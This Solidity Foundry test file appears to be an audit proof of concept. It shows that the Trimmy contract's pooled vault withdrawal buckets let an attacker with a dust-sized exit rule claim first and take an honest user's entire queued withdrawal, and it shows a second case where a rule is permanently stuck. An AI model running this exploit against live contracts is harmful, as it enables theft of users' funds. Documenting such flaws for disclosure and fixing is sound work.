// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry} from "../mocks/Mocks.sol";

/// @notice Transcription of the VERIFIED MyERC4626 source fetched from the Coston2 explorer for
///         0x9E63a5D282F2fBb7DcE822B98e363b2719D28319 on this run. Only the three behaviours
///         Trimmy touches are modelled, each mapped to a source line:
///           _withdraw   src:385  pendingWithdrawAssets[_receiver][period] += _assets   (POOLED)
///           _complete   src:401  require(_assets > 0, NoPendingWithdrawAssets())       (REVERTS)
///           _complete   src:407-411 delete whole bucket, transfer ALL to _receiverAddr
///           claimWithdraw src:92  _completeWithdraw(msg.sender, _period)
contract RealVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;
    uint256 public lagDuration = 300; // live value, read via cast
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawAssets;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawShares;

    error InvalidPeriod();
    error NoPendingWithdrawAssets();

    constructor(IERC20 a) ERC20("TESTearnXRP", "TESTearnXRP") {
        assetToken = a;
    }

    function decimals() public view override returns (uint8) {
        return MockERC20(address(assetToken)).decimals();
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1 share price
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (owner != msg.sender) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assets = shares;
        uint256 period = (block.timestamp + lagDuration) / 1 days;
        pendingWithdrawAssets[receiver][period] += assets;
        pendingWithdrawShares[receiver][period] += shares;
    }

    function claimWithdraw(uint256 period) external returns (uint256 assets) {
        if (period >= block.timestamp / 1 days) revert InvalidPeriod();
        assets = pendingWithdrawAssets[msg.sender][period];
        if (assets == 0) revert NoPendingWithdrawAssets();
        delete pendingWithdrawAssets[msg.sender][period];
        delete pendingWithdrawShares[msg.sender][period];
        assetToken.safeTransfer(msg.sender, assets);
    }
}

contract RefuteM2Test is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;
    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    MockERC20 internal fxrp;
    MockERC20 internal wflr;
    RealVault internal vault;
    MockFtsoV2 internal ftso;

    address internal alice = makeAddr("alice");
    address internal mallory = makeAddr("mallory");
    address internal keeper = makeAddr("keeper");
    address internal feeSink = makeAddr("feeSink");

    function setUp() public {
        vm.warp(10 days);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wflr = new MockERC20("WC2FLR", "WC2FLR", 18);
        vault = new RealVault(IERC20(address(fxrp)));

        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_FLR, 20_000, 6, uint64(vm.getBlockTimestamp()));
    }

    /// Exactly the LIVE allowlist shape: token0 = FXRP(6), token1 = WC2FLR(18),
    /// venue1 = the queued vault. The share token is NOT allowlisted, as on chain.
    function _liveShaped() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wflr), feedId: FEED_FLR, decimals: 18});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](1);
        venues[0] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(tokens, venues, 120, feeSink, IConfidentialTrigger(address(0)));
    }

    function _exitRule(uint128 amt) internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 0,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: amt,
            partSellAmount: amt,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// @notice THE REACHABILITY QUESTION. Anyone can transfer vault shares to Trimmy — there is no
    ///         guard against it (Trimmy.sol has no token-receipt hook and no balance invariant).
    ///         With shares parked in Trimmy, an EXIT_VAULT rule that sells the ALLOWLISTED FXRP
    ///         burns those donated shares and reaches _doQueueRedeem. So the claim path is
    ///         reachable on the live allowlist without any redeploy.
    function test_donatedSharesReachTheClaimPathOnTheLiveAllowlist() public {
        Trimmy live = _liveShaped();

        // Alice, an honest user, parks shares in Trimmy and exits 100 FXRP-worth.
        fxrp.mint(alice, 1_000e6);
        vm.startPrank(alice);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(100e6, alice);
        vault.transfer(address(live), 100e6); // donation: the only way to make EXIT_VAULT work
        fxrp.approve(address(live), type(uint256).max);
        uint256 ra = live.arm(_exitRule(100e6));
        vm.stopPrank();

        vm.prank(keeper);
        live.execute(ra);

        assertEq(live.ruleAt(ra).pendingShares, 100e6, "claim path IS reachable on live config");
        assertEq(
            vault.pendingWithdrawAssets(address(live), live.ruleAt(ra).claimPeriod),
            100e6,
            "queued under Trimmy's own address"
        );
    }

    /// @notice THE THEFT, on the live-shaped allowlist. Mallory needs one share unit and one FXRP
    ///         unit. She claims first and takes Alice's entire queued exit.
    function test_dustRuleDrainsHonestUsersBucket_liveShapedAllowlist() public {
        Trimmy live = _liveShaped();

        fxrp.mint(alice, 1_000e6);
        vm.startPrank(alice);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(100e6, alice);
        vault.transfer(address(live), 100e6);
        fxrp.approve(address(live), type(uint256).max);
        uint256 ra = live.arm(_exitRule(100e6));
        vm.stopPrank();

        fxrp.mint(mallory, 10);
        vm.startPrank(mallory);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(1, mallory); // 1 unit = 0.000001 FXRP
        vault.transfer(address(live), 1);
        fxrp.approve(address(live), type(uint256).max);
        uint256 rm = live.arm(_exitRule(1));
        vm.stopPrank();

        vm.startPrank(keeper);
        live.execute(ra);
        live.execute(rm);
        vm.stopPrank();

        assertEq(live.ruleAt(ra).claimPeriod, live.ruleAt(rm).claimPeriod, "one shared bucket");
        vm.warp(live.ruleAt(rm).claimableAt);

        uint256 before = fxrp.balanceOf(mallory);
        vm.prank(mallory);
        live.claim(rm);
        uint256 gained = fxrp.balanceOf(mallory) - before;
        console2.log("mallory queued 1 unit, received:", gained);
        assertEq(gained, 100e6 + 1, "mallory took alice's entire exit");

        // Alice's claim now reverts against the real vault's require(_assets > 0).
        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(alice);
        live.claim(ra);

        assertEq(live.ruleAt(ra).pendingShares, 100e6, "still pending, forever unclaimable");
        assertEq(vault.balanceOf(address(live)), 0, "shares burned");
    }

    /// @notice Is claim() ordering the only exposure, or is the bucket itself the flaw? Even with
    ///         a single honest user and NO attacker, two rules of the SAME user in one period
    ///         cannot both settle: the first claim pays everything to rule A's account and the
    ///         second reverts. Here both rules belong to alice so the money is not lost, but the
    ///         second rule is permanently stuck with pendingShares != 0.
    function test_sameUserTwoRulesSecondIsPermanentlyStuck() public {
        Trimmy live = _liveShaped();

        fxrp.mint(alice, 1_000e6);
        vm.startPrank(alice);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(60e6, alice);
        vault.transfer(address(live), 60e6);
        fxrp.approve(address(live), type(uint256).max);
        uint256 r1 = live.arm(_exitRule(30e6));
        uint256 r2 = live.arm(_exitRule(30e6));
        vm.stopPrank();

        vm.startPrank(keeper);
        live.execute(r1);
        live.execute(r2);
        vm.stopPrank();

        vm.warp(live.ruleAt(r1).claimableAt);
        vm.prank(keeper);
        live.claim(r1);
        assertEq(live.ruleAt(r1).pendingShares, 0);

        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(keeper);
        live.claim(r2);
        assertEq(live.ruleAt(r2).pendingShares, 30e6, "rule 2 wedged, no rescue function exists");
    }
}
